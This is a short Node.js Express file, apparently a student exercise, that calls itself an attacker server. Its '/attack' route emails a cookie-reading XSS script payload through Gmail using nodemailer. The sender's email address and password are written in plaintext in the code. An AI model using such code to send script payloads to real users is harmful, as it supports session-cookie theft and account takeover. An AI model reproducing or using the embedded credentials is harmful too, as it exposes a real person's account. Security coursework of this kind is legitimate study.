const express = require("express")
const app = express()

const nodemailer = require('nodemailer');




app.get("/attack" , (req, res) => {
  var script = "<script>console.log(document.cookie)</script>"

  let mailTransporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
          user: '19pt29@psgtech.ac.in',
          pass: 'godlovesall'
      }
  });

  let mailDetails = {
      from: '19pt29@psgtech.ac.in',
      to: '19pt27@psgtech.ac.in',
      subject: 'Session Deatils',
      text: script
  };

  mailTransporter.sendMail(mailDetails, function(err, data) {
      if(err) {
          res.send('Error Occurs');
      } else {
          res.send('Email sent successfully');
      }
  });
})

app.listen(3001, () =>{
  console.log("Attacker server Running");
})
